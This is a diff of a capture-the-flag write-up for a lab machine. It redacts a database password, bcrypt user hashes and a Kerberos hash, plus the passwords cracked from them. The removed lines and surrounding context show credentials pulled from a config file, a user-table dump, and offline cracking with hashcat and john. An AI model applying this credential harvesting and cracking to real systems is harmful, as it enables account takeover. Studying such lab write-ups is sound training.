@@ -152,7 +152,7 @@ Taking a look around we can find `db.php` in the current directory.
 try {
     $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
     $db_user = 'certificate_webapp_user'; // Change to your DB username
-    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
+    $db_passwd = '[REDACTED]'; // Change to your DB password
     $options = [
         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
         PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
@@ -164,12 +164,12 @@ try {
 ?>
 ```
 
-We can see the following credentials: `certificate_webapp_user`:`certificate_webapp_user`
+We can see the following credentials: `certificate_webapp_user`:`[REDACTED]`
 
 Since we know we have `xampp` installed let's use `mysql.exe` in `C:\xampp\mysql\bin` and let's take a look at the database
 
 ```powershell
-PS C:\xampp\mysql\bin> ./mysql.exe --host=localhost --user=certificate_webapp_user --password="cert!f!c@teDBPWD" --database=Certificate_WEBAPP_DB
+PS C:\xampp\mysql\bin> ./mysql.exe --host=localhost --user=certificate_webapp_user --password="[REDACTED]" --database=Certificate_WEBAPP_DB
 Welcome to the MariaDB monitor.  Commands end with ; or \g. 
 Your MariaDB connection id is 68
 Server version: 10.4.32-MariaDB mariadb.org binary distribution
@@ -184,13 +184,13 @@ MariaDB [Certificate_WEBAPP_DB]>
 We can find a users table and their hashes.
 ```
 MariaDB [Certificate_WEBAPP_DB]> select username,password from users; 
- Lorra.AAA | $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG 
- Sara1200  | $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK 
- Johney    | $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq 
- havokww   | $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti 
- stev      | $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 
- sara.b    | $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 
- w1ld      | $2y$04$Ub5vcDFaT83OqtqRMx4y.OlvhZqk95a6T6JThL4H3kRoSzIAOe6Dy 
+ Lorra.AAA | $2y$04$[REDACTED]
+ Sara1200  | $2y$04$[REDACTED]
+ Johney    | $2y$04$[REDACTED]
+ havokww   | $2y$04$[REDACTED]
+ stev      | $2y$04$[REDACTED]
+ sara.b    | $2y$04$[REDACTED]
+ w1ld      | $2y$04$[REDACTED]
 ```
 
 Let's try and crack these passwords with `hashcat`.
@@ -200,10 +200,10 @@ hashcat -a 0 passwords.pem -m 3200 /usr/share/wordlists/rockyou.txt --username
 
 After a while we get a password cracked!
 ```
-sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
+sara.b:[REDACTED]:[REDACTED]
 ```
 
-We get the following credentials: `sara.b`:`Blink182`
+We get the following credentials: `sara.b`:`[REDACTED]`
 
 Looking around we can find a `pcap` file.
 ```powershell
@@ -243,7 +243,7 @@ We can use a method shown in another box as demonstrated by [0xdf](https://0xdf.
 
 We should get the following hash:
 ```
-lion.sk:$krb5pa$18$Lion.SK$CERTIFICATE.HTB$CERTIFICATE.HTBLion.SK$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
+lion.sk:$krb5pa$18$Lion.SK$CERTIFICATE.HTB$CERTIFICATE.HTBLion.SK$23[REDACTED]
 ```
 
 Cracking it using `john` we get a password!
@@ -257,7 +257,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 128/128 AVX 4x])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-!QAZ2wsx         (lion.sk)     
+[REDACTED]        (lion.sk)     
 1g 0:00:00:01 DONE (2025-06-01 00:26) 0.5291g/s 7585p/s 7585c/s 7585C/s goodman..cherry13
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
